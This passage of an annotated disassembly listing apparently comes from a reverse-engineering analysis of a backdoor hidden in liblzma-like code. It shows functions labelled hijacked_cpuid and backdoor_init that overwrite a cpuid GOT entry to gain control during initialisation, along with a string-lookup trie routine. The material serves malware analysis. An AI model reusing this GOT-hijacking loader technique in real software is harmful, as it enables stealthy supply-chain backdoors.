.text.parse_lzma12z:000000000000A5FD loc_A5FD:                               ; CODE XREF: _Llzma12_mode_map_part_1+23A↓j
.text.parse_lzma12z:000000000000A5FD                 mov     cl, [rsi+rax]
.text.parse_lzma12z:000000000000A600                 mov     [rdx+rax], cl
.text.parse_lzma12z:000000000000A603                 inc     rax
.text.parse_lzma12z:000000000000A606                 cmp     rax, 0Eh
.text.parse_lzma12z:000000000000A60A                 jnz     short loc_A5FD
.text.parse_lzma12z:000000000000A60C                 mov     [rsp+458h+var_215], 20h ; ' '
.text.parse_lzma12z:000000000000A614                 mov     rsi, [rbx+30h]
.text.parse_lzma12z:000000000000A618                 xor     eax, eax
.text.parse_lzma12z:000000000000A61A                 lea     rdx, [rsp+458h+var_214]
.text.parse_lzma12z:000000000000A622
.text.parse_lzma12z:000000000000A622 loc_A622:                               ; CODE XREF: _Llzma12_mode_map_part_1+25F↓j
.text.parse_lzma12z:000000000000A622                 mov     cl, [rsi+rax]
.text.parse_lzma12z:000000000000A625                 mov     [rdx+rax], cl
.text.parse_lzma12z:000000000000A628                 inc     rax
.text.parse_lzma12z:000000000000A62B                 cmp     rax, 4
.text.parse_lzma12z:000000000000A62F                 jnz     short loc_A622
.text.parse_lzma12z:000000000000A631                 mov     [rsp+458h+var_210], 20h ; ' '
.text.parse_lzma12z:000000000000A639                 mov     rax, [rbx+10h]
.text.parse_lzma12z:000000000000A63D                 mov     dl, [rax]
.text.parse_lzma12z:000000000000A63F                 mov     [rsp+458h+var_20F], dl
.text.parse_lzma12z:000000000000A646                 mov     al, [rax+1]
.text.parse_lzma12z:000000000000A649                 mov     [rsp+458h+var_20D], 20h ; ' '
.text.parse_lzma12z:000000000000A651                 mov     [rsp+458h+var_20E], al
.text.parse_lzma12z:000000000000A658                 mov     rax, [rbx+10h]
.text.parse_lzma12z:000000000000A65C                 mov     dl, [rax]
.text.parse_lzma12z:000000000000A65E                 mov     [rsp+458h+var_20C], dl
.text.parse_lzma12z:000000000000A665                 mov     al, [rax+1]
.text.parse_lzma12z:000000000000A668                 lea     rdx, [rsp+458h+var_208]
.text.parse_lzma12z:000000000000A670                 mov     [rsp+458h+var_20A], 5B20h
.text.parse_lzma12z:000000000000A67A                 mov     [rsp+458h+var_20B], al
.text.parse_lzma12z:000000000000A681                 mov     rsi, [rbx+20h]
.text.parse_lzma12z:000000000000A685                 xor     eax, eax
.text.parse_lzma12z:000000000000A687
.text.parse_lzma12z:000000000000A687 loc_A687:                               ; CODE XREF: _Llzma12_mode_map_part_1+2C4↓j
.text.parse_lzma12z:000000000000A687                 mov     cl, [rsi+rax]
.text.parse_lzma12z:000000000000A68A                 mov     [rdx+rax], cl
.text.parse_lzma12z:000000000000A68D                 inc     rax
.text.parse_lzma12z:000000000000A690                 cmp     rax, 7
.text.parse_lzma12z:000000000000A694                 jnz     short loc_A687
.text.parse_lzma12z:000000000000A696                 test    r13, r13
.text.parse_lzma12z:000000000000A699                 mov     [rsp+458h+var_201], 5Dh ; ']'
.text.parse_lzma12z:000000000000A6A1                 setnz   bpl
.text.parse_lzma12z:000000000000A6A5                 cmp     dword ptr [rbx+8], 0
.text.parse_lzma12z:000000000000A6A9                 mov     dword ptr [rbx], 1
.text.parse_lzma12z:000000000000A6AF                 jz      short loc_A6C6
.text.parse_lzma12z:000000000000A6B1                 test    bpl, bpl
.text.parse_lzma12z:000000000000A6B4                 jz      short loc_A6C6
.text.parse_lzma12z:000000000000A6B6                 mov     rax, [r13+58h]
.text.parse_lzma12z:000000000000A6BA                 test    rax, rax
.text.parse_lzma12z:000000000000A6BD                 jz      short loc_A6C6
.text.parse_lzma12z:000000000000A6BF                 mov     edi, 0FFh
.text.parse_lzma12z:000000000000A6C4                 call    rax
.text.parse_lzma12z:000000000000A6C6
.text.parse_lzma12z:000000000000A6C6 loc_A6C6:                               ; CODE XREF: _Llzma12_mode_map_part_1+2DF↑j
.text.parse_lzma12z:000000000000A6C6                                         ; _Llzma12_mode_map_part_1+2E4↑j ...
.text.parse_lzma12z:000000000000A6C6                 xor     eax, eax
.text.parse_lzma12z:000000000000A6C8                 lea     rcx, [rsp+458h+var_338]
.text.parse_lzma12z:000000000000A6D0                 mov     rdx, r12
.text.parse_lzma12z:000000000000A6D3                 mov     rdi, rbx
.text.parse_lzma12z:000000000000A6D6                 lea     r8, [rsp+458h+var_438]
.text.parse_lzma12z:000000000000A6DB                 mov     esi, 3
.text.parse_lzma12z:000000000000A6E0                 call    sub_7430
.text.parse_lzma12z:000000000000A6E5                 cmp     dword ptr [rbx+8], 0
.text.parse_lzma12z:000000000000A6E9                 jz      short loc_A710
.text.parse_lzma12z:000000000000A6EB                 test    bpl, bpl
.text.parse_lzma12z:000000000000A6EE
.text.parse_lzma12z:000000000000A6EE loc_A6EE:                               ; CODE XREF: _Llzma12_mode_map_part_1+12B↑j
.text.parse_lzma12z:000000000000A6EE                 jz      short loc_A710
.text.parse_lzma12z:000000000000A6F0                 mov     rax, [r13+58h]
.text.parse_lzma12z:000000000000A6F4                 test    rax, rax
.text.parse_lzma12z:000000000000A6F7                 jz      short loc_A710
.text.parse_lzma12z:000000000000A6F9                 mov     edi, 80000000h
.text.parse_lzma12z:000000000000A6FE                 call    rax
.text.parse_lzma12z:000000000000A700                 jmp     short loc_A710
.text.parse_lzma12z:000000000000A702 ; ---------------------------------------------------------------------------
.text.parse_lzma12z:000000000000A702
.text.parse_lzma12z:000000000000A702 loc_A702:                               ; CODE XREF: _Llzma12_mode_map_part_1+13C↑j
.text.parse_lzma12z:000000000000A702                 inc     rbp
.text.parse_lzma12z:000000000000A705                 jmp     loc_A47C
.text.parse_lzma12z:000000000000A70A ; ---------------------------------------------------------------------------
.text.parse_lzma12z:000000000000A70A
.text.parse_lzma12z:000000000000A70A loc_A70A:                               ; CODE XREF: _Llzma12_mode_map_part_1+71↑j
.text.parse_lzma12z:000000000000A70A                                         ; _Llzma12_mode_map_part_1+19E↑j ...
.text.parse_lzma12z:000000000000A70A                 mov     dword ptr [rbx], 1
.text.parse_lzma12z:000000000000A710
.text.parse_lzma12z:000000000000A710 loc_A710:                               ; CODE XREF: _Llzma12_mode_map_part_1+7A↑j
.text.parse_lzma12z:000000000000A710                                         ; _Llzma12_mode_map_part_1+87↑j ...
.text.parse_lzma12z:000000000000A710                 add     rsp, 428h
.text.parse_lzma12z:000000000000A717                 pop     rbx
.text.parse_lzma12z:000000000000A718                 pop     rbp
.text.parse_lzma12z:000000000000A719                 pop     r12
.text.parse_lzma12z:000000000000A71B                 pop     r13
.text.parse_lzma12z:000000000000A71D                 pop     r14
.text.parse_lzma12z:000000000000A71F                 pop     r15
.text.parse_lzma12z:000000000000A721                 retn
.text.parse_lzma12z:000000000000A721 _Llzma12_mode_map_part_1 endp
.text.parse_lzma12z:000000000000A721
.text.parse_lzma12z:000000000000A721 _text_parse_lzma12z ends
.text.parse_lzma12z:000000000000A721
.text._cpuid:000000000000A730 ; ===========================================================================
.text._cpuid:000000000000A730
.text._cpuid:000000000000A730 ; Segment type: Pure code
.text._cpuid:000000000000A730 ; Segment permissions: Read/Execute
.text._cpuid:000000000000A730 _text__cpuid    segment para public 'CODE' use64
.text._cpuid:000000000000A730                 assume cs:_text__cpuid
.text._cpuid:000000000000A730                 ;org 0A730h
.text._cpuid:000000000000A730                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text._cpuid:000000000000A730
.text._cpuid:000000000000A730 ; =============== S U B R O U T I N E =======================================
.text._cpuid:000000000000A730
.text._cpuid:000000000000A730
.text._cpuid:000000000000A730 ; __int64 __fastcall cpuid(unsigned int, _DWORD *, _DWORD *, _DWORD *, _DWORD *)
.text._cpuid:000000000000A730                 public _cpuid
.text._cpuid:000000000000A730 _cpuid          proc near               ; CODE XREF: hijacked_cpuid+65↓p
.text._cpuid:000000000000A730                                         ; backdoor_init+53↓p ...
.text._cpuid:000000000000A730                 endbr64
.text._cpuid:000000000000A734                 push    rbx
.text._cpuid:000000000000A735                 mov     r10, rsi
.text._cpuid:000000000000A738                 mov     r9, rdx
.text._cpuid:000000000000A73B                 mov     rsi, rcx
.text._cpuid:000000000000A73E                 mov     eax, edi
.text._cpuid:000000000000A740                 cpuid
.text._cpuid:000000000000A742                 mov     [r10], eax
.text._cpuid:000000000000A745                 mov     [r9], ebx
.text._cpuid:000000000000A748                 pop     rbx
.text._cpuid:000000000000A749                 mov     [rsi], ecx
.text._cpuid:000000000000A74B                 mov     [r8], edx
.text._cpuid:000000000000A74E                 retn
.text._cpuid:000000000000A74E _cpuid          endp
.text._cpuid:000000000000A74E
.text._cpuid:000000000000A74E _text__cpuid    ends
.text._cpuid:000000000000A74E
.text._get_cpuia:000000000000A750 ; ===========================================================================
.text._get_cpuia:000000000000A750
.text._get_cpuia:000000000000A750 ; Segment type: Pure code
.text._get_cpuia:000000000000A750 ; Segment permissions: Read/Execute
.text._get_cpuia:000000000000A750 _text__get_cpuia segment para public 'CODE' use64
.text._get_cpuia:000000000000A750                 assume cs:_text__get_cpuia
.text._get_cpuia:000000000000A750                 ;org 0A750h
.text._get_cpuia:000000000000A750                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text._get_cpuia:000000000000A750
.text._get_cpuia:000000000000A750 ; =============== S U B R O U T I N E =======================================
.text._get_cpuia:000000000000A750
.text._get_cpuia:000000000000A750 ; Attributes: bp-based frame
.text._get_cpuia:000000000000A750
.text._get_cpuia:000000000000A750 ; __int64 __fastcall hijacked_cpuid(unsigned int edi0, _DWORD *)
.text._get_cpuia:000000000000A750                 public hijacked_cpuid
.text._get_cpuia:000000000000A750 hijacked_cpuid  proc near               ; CODE XREF: _get_cpuid+27↓p
.text._get_cpuia:000000000000A750
.text._get_cpuia:000000000000A750 var_60          = qword ptr -60h
.text._get_cpuia:000000000000A750 var_58          = qword ptr -58h
.text._get_cpuia:000000000000A750 var_4C          = dword ptr -4Ch
.text._get_cpuia:000000000000A750 var_48          = dword ptr -48h
.text._get_cpuia:000000000000A750 var_44          = dword ptr -44h
.text._get_cpuia:000000000000A750 ctx             = rootkit_ctx ptr -40h
.text._get_cpuia:000000000000A750
.text._get_cpuia:000000000000A750                 push    rbp
.text._get_cpuia:000000000000A751                 xor     r9d, r9d
.text._get_cpuia:000000000000A754                 mov     rbp, rsp
.text._get_cpuia:000000000000A757                 push    rbx
.text._get_cpuia:000000000000A758                 mov     ebx, edi
.text._get_cpuia:000000000000A75A                 lea     r8, [rbp+ctx]
.text._get_cpuia:000000000000A75E                 sub     rsp, 58h
.text._get_cpuia:000000000000A762                 cmp     cs:global_counter, 1
.text._get_cpuia:000000000000A769                 jnz     short loc_A7A1
.text._get_cpuia:000000000000A76B                 xor     eax, eax
.text._get_cpuia:000000000000A76D                 mov     rdi, r8         ; ctx
.text._get_cpuia:000000000000A770                 mov     [rbp+var_58], r8
.text._get_cpuia:000000000000A774                 mov     [rbp+ctx.runtime_addr], 1
.text._get_cpuia:000000000000A77C                 mov     [rbp+ctx.runtime_offset], rax
.text._get_cpuia:000000000000A780                 mov     [rbp+ctx.cpuid_got_ptr], rax
.text._get_cpuia:000000000000A784                 mov     [rbp+ctx.cpu_id_got], rax
.text._get_cpuia:000000000000A788                 mov     [rbp+ctx.self], rax
.text._get_cpuia:000000000000A78C                 mov     [rbp+ctx.got_ptr], rsi
.text._get_cpuia:000000000000A790                 mov     [rbp+var_60], rsi
.text._get_cpuia:000000000000A794                 call    backdoor_init   ; PIC mode
.text._get_cpuia:000000000000A799                 mov     r8, [rbp+var_58]
.text._get_cpuia:000000000000A79D                 mov     r9, [rbp+var_60]
.text._get_cpuia:000000000000A7A1
.text._get_cpuia:000000000000A7A1 loc_A7A1:                               ; CODE XREF: hijacked_cpuid+19↑j
.text._get_cpuia:000000000000A7A1                 lea     rcx, [rbp+var_44]
.text._get_cpuia:000000000000A7A5                 lea     rdx, [rbp+var_48]
.text._get_cpuia:000000000000A7A9                 mov     edi, ebx
.text._get_cpuia:000000000000A7AB                 inc     cs:global_counter
.text._get_cpuia:000000000000A7B1                 lea     rsi, [rbp+var_4C]
.text._get_cpuia:000000000000A7B5                 call    _cpuid          ; PIC mode
.text._get_cpuia:000000000000A7BA                 mov     eax, [rbp+var_4C]
.text._get_cpuia:000000000000A7BD                 add     rsp, 58h
.text._get_cpuia:000000000000A7C1                 pop     rbx
.text._get_cpuia:000000000000A7C2                 pop     rbp
.text._get_cpuia:000000000000A7C3                 retn
.text._get_cpuia:000000000000A7C3 hijacked_cpuid  endp
.text._get_cpuia:000000000000A7C3
.text._get_cpuia:000000000000A7C4
.text._get_cpuia:000000000000A7C4 ; =============== S U B R O U T I N E =======================================
.text._get_cpuia:000000000000A7C4
.text._get_cpuia:000000000000A7C4
.text._get_cpuia:000000000000A7C4 ; __int64 __fastcall backdoor_init(rootkit_ctx *ctx, _DWORD *rbp_m10)
.text._get_cpuia:000000000000A7C4 backdoor_init   proc near               ; CODE XREF: hijacked_cpuid+44↑p
.text._get_cpuia:000000000000A7C4
.text._get_cpuia:000000000000A7C4 cpuid_got_ptr_1 = qword ptr -28h
.text._get_cpuia:000000000000A7C4 var_20          = qword ptr -20h
.text._get_cpuia:000000000000A7C4
.text._get_cpuia:000000000000A7C4                 endbr64
.text._get_cpuia:000000000000A7C8                 push    r12
.text._get_cpuia:000000000000A7CA                 mov     [rdi+20h], rdi
.text._get_cpuia:000000000000A7CE                 sub     rsp, 28h
.text._get_cpuia:000000000000A7D2                 mov     [rsp+30h+var_20], rdi
.text._get_cpuia:000000000000A7D7                 call    backdoor_ctx_save ; PIC mode
.text._get_cpuia:000000000000A7DC                 mov     rdi, [rsp+30h+var_20]
.text._get_cpuia:000000000000A7E1                 lea     rcx, ro_gots
.text._get_cpuia:000000000000A7E8                 mov     rax, [rdi+10h]
.text._get_cpuia:000000000000A7EC                 mov     [rdi+28h], rax
.text._get_cpuia:000000000000A7F0                 mov     rax, [rdi]
.text._get_cpuia:000000000000A7F3                 sub     rax, [rdi+20h]
.text._get_cpuia:000000000000A7F7                 mov     [rdi+8], rax
.text._get_cpuia:000000000000A7FB                 mov     rdx, rax
.text._get_cpuia:000000000000A7FE                 add     rdx, [rcx+8]
.text._get_cpuia:000000000000A802                 mov     [rdi+10h], rdx
.text._get_cpuia:000000000000A806                 jz      short loc_A825
.text._get_cpuia:000000000000A808                 mov     [rsp+30h+cpuid_got_ptr_1], rdx
.text._get_cpuia:000000000000A80D                 mov     r12, [rdx]
.text._get_cpuia:000000000000A810                 add     rax, [rcx+10h]
.text._get_cpuia:000000000000A814                 mov     [rdx], rax
.text._get_cpuia:000000000000A817                 call    cs:_cpuid_ptr
.text._get_cpuia:000000000000A81D                 mov     rdx, [rsp+30h+cpuid_got_ptr_1]
.text._get_cpuia:000000000000A822                 mov     [rdx], r12
.text._get_cpuia:000000000000A825
.text._get_cpuia:000000000000A825 loc_A825:                               ; CODE XREF: backdoor_init+42↑j
.text._get_cpuia:000000000000A825                 add     rsp, 28h
.text._get_cpuia:000000000000A829                 pop     r12
.text._get_cpuia:000000000000A82B                 retn
.text._get_cpuia:000000000000A82B backdoor_init   endp
.text._get_cpuia:000000000000A82B
.text._get_cpuia:000000000000A82B _text__get_cpuia ends
.text._get_cpuia:000000000000A82B
.text._get_cpuid:000000000000A830 ; ===========================================================================
.text._get_cpuid:000000000000A830
.text._get_cpuid:000000000000A830 ; Segment type: Pure code
.text._get_cpuid:000000000000A830 ; Segment permissions: Read/Execute
.text._get_cpuid:000000000000A830 _text__get_cpuid segment para public 'CODE' use64
.text._get_cpuid:000000000000A830                 assume cs:_text__get_cpuid
.text._get_cpuid:000000000000A830                 ;org 0A830h
.text._get_cpuid:000000000000A830                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text._get_cpuid:000000000000A830
.text._get_cpuid:000000000000A830 ; =============== S U B R O U T I N E =======================================
.text._get_cpuid:000000000000A830
.text._get_cpuid:000000000000A830
.text._get_cpuid:000000000000A830 ; __int64 __fastcall get_cpuid(unsigned int a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *_r9)
.text._get_cpuid:000000000000A830                 public _get_cpuid
.text._get_cpuid:000000000000A830 _get_cpuid      proc near
.text._get_cpuid:000000000000A830
.text._get_cpuid:000000000000A830 var_30          = qword ptr -30h
.text._get_cpuid:000000000000A830 var_28          = qword ptr -28h
.text._get_cpuid:000000000000A830 var_20          = qword ptr -20h
.text._get_cpuid:000000000000A830
.text._get_cpuid:000000000000A830                 endbr64
.text._get_cpuid:000000000000A834                 push    rbp
.text._get_cpuid:000000000000A835                 mov     rbp, rsi
.text._get_cpuid:000000000000A838                 mov     rsi, r9
.text._get_cpuid:000000000000A83B                 push    rbx
.text._get_cpuid:000000000000A83C                 mov     ebx, edi
.text._get_cpuid:000000000000A83E                 and     edi, 80000000h
.text._get_cpuid:000000000000A844                 sub     rsp, 28h
.text._get_cpuid:000000000000A848                 mov     [rsp+38h+var_20], rdx
.text._get_cpuid:000000000000A84D                 mov     [rsp+38h+var_28], rcx
.text._get_cpuid:000000000000A852                 mov     [rsp+38h+var_30], r8
.text._get_cpuid:000000000000A857                 call    hijacked_cpuid
.text._get_cpuid:000000000000A85C                 test    eax, eax
.text._get_cpuid:000000000000A85E                 jz      short loc_A887
.text._get_cpuid:000000000000A860                 cmp     eax, ebx
.text._get_cpuid:000000000000A862                 jb      short loc_A887
.text._get_cpuid:000000000000A864                 mov     r8, [rsp+38h+var_30]
.text._get_cpuid:000000000000A869                 mov     rcx, [rsp+38h+var_28]
.text._get_cpuid:000000000000A86E                 xor     r9d, r9d
.text._get_cpuid:000000000000A871                 mov     rsi, rbp
.text._get_cpuid:000000000000A874                 mov     rdx, [rsp+38h+var_20]
.text._get_cpuid:000000000000A879                 mov     edi, ebx
.text._get_cpuid:000000000000A87B                 call    _cpuid          ; PIC mode
.text._get_cpuid:000000000000A880                 mov     eax, 1
.text._get_cpuid:000000000000A885                 jmp     short loc_A889
.text._get_cpuid:000000000000A887 ; ---------------------------------------------------------------------------
.text._get_cpuid:000000000000A887
.text._get_cpuid:000000000000A887 loc_A887:                               ; CODE XREF: _get_cpuid+2E↑j
.text._get_cpuid:000000000000A887                                         ; _get_cpuid+32↑j
.text._get_cpuid:000000000000A887                 xor     eax, eax
.text._get_cpuid:000000000000A889
.text._get_cpuid:000000000000A889 loc_A889:                               ; CODE XREF: _get_cpuid+55↑j
.text._get_cpuid:000000000000A889                 add     rsp, 28h
.text._get_cpuid:000000000000A88D                 pop     rbx
.text._get_cpuid:000000000000A88E                 pop     rbp
.text._get_cpuid:000000000000A88F                 retn
.text._get_cpuid:000000000000A88F _get_cpuid      endp
.text._get_cpuid:000000000000A88F
.text._get_cpuid:000000000000A88F _text__get_cpuid ends
.text._get_cpuid:000000000000A88F
.text.lzma_outq_inia:000000000000A890 ; ===========================================================================
.text.lzma_outq_inia:000000000000A890
.text.lzma_outq_inia:000000000000A890 ; Segment type: Pure code
.text.lzma_outq_inia:000000000000A890 ; Segment permissions: Read/Execute
.text.lzma_outq_inia:000000000000A890 _text_lzma_outq_inia segment para public 'CODE' use64
.text.lzma_outq_inia:000000000000A890                 assume cs:_text_lzma_outq_inia
.text.lzma_outq_inia:000000000000A890                 ;org 0A890h
.text.lzma_outq_inia:000000000000A890                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_outq_inia:000000000000A890
.text.lzma_outq_inia:000000000000A890 ; =============== S U B R O U T I N E =======================================
.text.lzma_outq_inia:000000000000A890
.text.lzma_outq_inia:000000000000A890
.text.lzma_outq_inia:000000000000A890 ; __int64 __fastcall count_1_bits(__int64)
.text.lzma_outq_inia:000000000000A890                 public count_1_bits
.text.lzma_outq_inia:000000000000A890 count_1_bits    proc near               ; CODE XREF: _Llzma_index_iter_locate_1+37A↑p
.text.lzma_outq_inia:000000000000A890                                         ; table_get+9B↓p
.text.lzma_outq_inia:000000000000A890                 endbr64
.text.lzma_outq_inia:000000000000A894                 xor     eax, eax
.text.lzma_outq_inia:000000000000A896
.text.lzma_outq_inia:000000000000A896 loc_A896:                               ; CODE XREF: count_1_bits+14↓j
.text.lzma_outq_inia:000000000000A896                 test    rdi, rdi
.text.lzma_outq_inia:000000000000A899                 jz      short locret_A8A6
.text.lzma_outq_inia:000000000000A89B                 lea     rdx, [rdi-1]
.text.lzma_outq_inia:000000000000A89F                 inc     eax
.text.lzma_outq_inia:000000000000A8A1                 and     rdi, rdx
.text.lzma_outq_inia:000000000000A8A4                 jmp     short loc_A896
.text.lzma_outq_inia:000000000000A8A6 ; ---------------------------------------------------------------------------
.text.lzma_outq_inia:000000000000A8A6
.text.lzma_outq_inia:000000000000A8A6 locret_A8A6:                            ; CODE XREF: count_1_bits+9↑j
.text.lzma_outq_inia:000000000000A8A6                 retn
.text.lzma_outq_inia:000000000000A8A6 count_1_bits    endp
.text.lzma_outq_inia:000000000000A8A6
.text.lzma_outq_inia:000000000000A8A6 _text_lzma_outq_inia ends
.text.lzma_outq_inia:000000000000A8A6
.text.simple_coder_updata:000000000000A8B0 ; ===========================================================================
.text.simple_coder_updata:000000000000A8B0
.text.simple_coder_updata:000000000000A8B0 ; Segment type: Pure code
.text.simple_coder_updata:000000000000A8B0 ; Segment permissions: Read/Execute
.text.simple_coder_updata:000000000000A8B0 _text_simple_coder_updata segment para public 'CODE' use64
.text.simple_coder_updata:000000000000A8B0                 assume cs:_text_simple_coder_updata
.text.simple_coder_updata:000000000000A8B0                 ;org 0A8B0h
.text.simple_coder_updata:000000000000A8B0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.simple_coder_updata:000000000000A8B0
.text.simple_coder_updata:000000000000A8B0 ; =============== S U B R O U T I N E =======================================
.text.simple_coder_updata:000000000000A8B0
.text.simple_coder_updata:000000000000A8B0 ; 0x00007ffff7fabe70
.text.simple_coder_updata:000000000000A8B0
.text.simple_coder_updata:000000000000A8B0 ; char *__fastcall table_get(char *a1, unsigned __int64 a2)
.text.simple_coder_updata:000000000000A8B0                 public table_get
.text.simple_coder_updata:000000000000A8B0 table_get       proc near               ; CODE XREF: import_lookup_get_str+141↑p
.text.simple_coder_updata:000000000000A8B0                                         ; import_lookup_get_str+25A↑p ...
.text.simple_coder_updata:000000000000A8B0                 endbr64
.text.simple_coder_updata:000000000000A8B4                 push    rbp
.text.simple_coder_updata:000000000000A8B5                 mov     edx, 8
.text.simple_coder_updata:000000000000A8BA                 mov     rbp, rsi
.text.simple_coder_updata:000000000000A8BD                 mov     esi, 0Ah
.text.simple_coder_updata:000000000000A8C2                 push    rbx
.text.simple_coder_updata:000000000000A8C3                 mov     rbx, rdi
.text.simple_coder_updata:000000000000A8C6                 xor     edi, edi
.text.simple_coder_updata:000000000000A8C8                 push    rcx
.text.simple_coder_updata:000000000000A8C9                 mov     ecx, 1
.text.simple_coder_updata:000000000000A8CE                 call    apply_one_entry_ex ; PIC mode
.text.simple_coder_updata:000000000000A8D3                 mov     edx, eax
.text.simple_coder_updata:000000000000A8D5                 xor     eax, eax
.text.simple_coder_updata:000000000000A8D7                 test    edx, edx
.text.simple_coder_updata:000000000000A8D9                 jz      loc_A9B1
.text.simple_coder_updata:000000000000A8DF                 lea     r8, [rbx+2Ch]
.text.simple_coder_updata:000000000000A8E3                 test    rbp, rbp
.text.simple_coder_updata:000000000000A8E6                 jz      short loc_A8EF
.text.simple_coder_updata:000000000000A8E8                 cmp     r8, rbp
.text.simple_coder_updata:000000000000A8EB                 cmova   r8, rbp
.text.simple_coder_updata:000000000000A8EF
.text.simple_coder_updata:000000000000A8EF loc_A8EF:                               ; CODE XREF: table_get+36↑j
.text.simple_coder_updata:000000000000A8EF                 mov     rax, offset trie_table1
.text.simple_coder_updata:000000000000A8F6                 lea     r9, [rax+13E8h]
.text.simple_coder_updata:000000000000A8FD                 mov     rax, offset trie_table2
.text.simple_coder_updata:000000000000A904                 lea     rsi, [rax+760h]
.text.simple_coder_updata:000000000000A90B
.text.simple_coder_updata:000000000000A90B loc_A90B:                               ; CODE XREF: table_get+FA↓j
.text.simple_coder_updata:000000000000A90B                 cmp     r8, rbx
.text.simple_coder_updata:000000000000A90E                 jb      loc_A9AF
.text.simple_coder_updata:000000000000A914                 mov     cl, [rbx]
.text.simple_coder_updata:000000000000A916                 test    cl, cl
.text.simple_coder_updata:000000000000A918                 js      loc_A9AF
.text.simple_coder_updata:000000000000A91E                 cmp     cl, 3Fh ; '?'
.text.simple_coder_updata:000000000000A921                 ja      short loc_A937
.text.simple_coder_updata:000000000000A923                 mov     r10, [rsi]
.text.simple_coder_updata:000000000000A926                 mov     rax, r10
.text.simple_coder_updata:000000000000A929                 shr     rax, cl
.text.simple_coder_updata:000000000000A92C                 test    al, 1
.text.simple_coder_updata:000000000000A92E                 mov     eax, 0
.text.simple_coder_updata:000000000000A933                 jnz     short loc_A950
.text.simple_coder_updata:000000000000A935                 jmp     short loc_A9B1
.text.simple_coder_updata:000000000000A937 ; ---------------------------------------------------------------------------
.text.simple_coder_updata:000000000000A937
.text.simple_coder_updata:000000000000A937 loc_A937:                               ; CODE XREF: table_get+71↑j
.text.simple_coder_updata:000000000000A937                 mov     r10, [rsi+8]
.text.simple_coder_updata:000000000000A93B                 sub     ecx, 40h ; '@'
.text.simple_coder_updata:000000000000A93E                 mov     rax, r10
.text.simple_coder_updata:000000000000A941                 shr     rax, cl
.text.simple_coder_updata:000000000000A944                 test    al, 1
.text.simple_coder_updata:000000000000A946                 jz      short loc_A9AF
.text.simple_coder_updata:000000000000A948                 mov     rdi, [rsi]
.text.simple_coder_updata:000000000000A94B                 call    count_1_bits    ; PIC mode
.text.simple_coder_updata:000000000000A950
.text.simple_coder_updata:000000000000A950 loc_A950:                               ; CODE XREF: table_get+83↑j
.text.simple_coder_updata:000000000000A950                 movzx   ecx, cl
.text.simple_coder_updata:000000000000A953
.text.simple_coder_updata:000000000000A953 loc_A953:                               ; CODE XREF: table_get+B4↓j
.text.simple_coder_updata:000000000000A953                 bsf     rdx, r10
.text.simple_coder_updata:000000000000A957                 cmp     edx, ecx
.text.simple_coder_updata:000000000000A959                 jz      short loc_A966
.text.simple_coder_updata:000000000000A95B                 lea     rdx, [r10-1]
.text.simple_coder_updata:000000000000A95F                 inc     eax
.text.simple_coder_updata:000000000000A961                 and     r10, rdx
.text.simple_coder_updata:000000000000A964                 jmp     short loc_A953
.text.simple_coder_updata:000000000000A966 ; ---------------------------------------------------------------------------
.text.simple_coder_updata:000000000000A966
.text.simple_coder_updata:000000000000A966 loc_A966:                               ; CODE XREF: table_get+A9↑j
.text.simple_coder_updata:000000000000A966                 mov     eax, eax
.text.simple_coder_updata:000000000000A968                 lea     rax, [r9+rax*4]
.text.simple_coder_updata:000000000000A96C                 mov     cx, [rax]
.text.simple_coder_updata:000000000000A96F                 movsx   eax, word ptr [rax+2]
.text.simple_coder_updata:000000000000A973                 test    cl, 4
.text.simple_coder_updata:000000000000A976                 jnz     short loc_A9B1
.text.simple_coder_updata:000000000000A978                 test    cl, 2
.text.simple_coder_updata:000000000000A97B                 jz      short loc_A982
.text.simple_coder_updata:000000000000A97D                 and     ecx, 0FFFFFFFDh
.text.simple_coder_updata:000000000000A980                 jmp     short loc_A984
.text.simple_coder_updata:000000000000A982 ; ---------------------------------------------------------------------------
.text.simple_coder_updata:000000000000A982
.text.simple_coder_updata:000000000000A982 loc_A982:                               ; CODE XREF: table_get+CB↑j
.text.simple_coder_updata:000000000000A982                 neg     eax
.text.simple_coder_updata:000000000000A984
.text.simple_coder_updata:000000000000A984 loc_A984:                               ; CODE XREF: table_get+D0↑j
.text.simple_coder_updata:000000000000A984                 mov     edi, ecx
.text.simple_coder_updata:000000000000A986                 mov     edx, ecx
.text.simple_coder_updata:000000000000A988                 neg     edi
.text.simple_coder_updata:000000000000A98A                 and     edx, 0FFFFFFFEh
.text.simple_coder_updata:000000000000A98D                 and     cl, 1
.text.simple_coder_updata:000000000000A990                 cmovz   edx, edi
.text.simple_coder_updata:000000000000A993                 sub     eax, 4
.text.simple_coder_updata:000000000000A996                 inc     rbx
.text.simple_coder_updata:000000000000A999                 movsx   rax, ax
.text.simple_coder_updata:000000000000A99D                 sub     edx, 10h
.text.simple_coder_updata:000000000000A9A0                 add     r9, rax
.text.simple_coder_updata:000000000000A9A3                 movsx   rdx, dx
.text.simple_coder_updata:000000000000A9A7                 add     rsi, rdx
.text.simple_coder_updata:000000000000A9AA                 jmp     loc_A90B
.text.simple_coder_updata:000000000000A9AF ; ---------------------------------------------------------------------------
.text.simple_coder_updata:000000000000A9AF
.text.simple_coder_updata:000000000000A9AF loc_A9AF:                               ; CODE XREF: table_get+5E↑j
.text.simple_coder_updata:000000000000A9AF                                         ; table_get+68↑j ...
.text.simple_coder_updata:000000000000A9AF                 xor     eax, eax
.text.simple_coder_updata:000000000000A9B1
.text.simple_coder_updata:000000000000A9B1 loc_A9B1:                               ; CODE XREF: table_get+29↑j
.text.simple_coder_updata:000000000000A9B1                                         ; table_get+85↑j ...
.text.simple_coder_updata:000000000000A9B1                 pop     rdx
.text.simple_coder_updata:000000000000A9B2                 pop     rbx
.text.simple_coder_updata:000000000000A9B3                 pop     rbp
.text.simple_coder_updata:000000000000A9B4                 retn
.text.simple_coder_updata:000000000000A9B4 table_get       endp
.text.simple_coder_updata:000000000000A9B4
.text.simple_coder_updata:000000000000A9B4 _text_simple_coder_updata ends
.text.simple_coder_updata:000000000000A9B4
.text.lzma_lzma_encoder_inia:000000000000A9C0 ; ===========================================================================
.text.lzma_lzma_encoder_inia:000000000000A9C0
.text.lzma_lzma_encoder_inia:000000000000A9C0 ; Segment type: Pure code
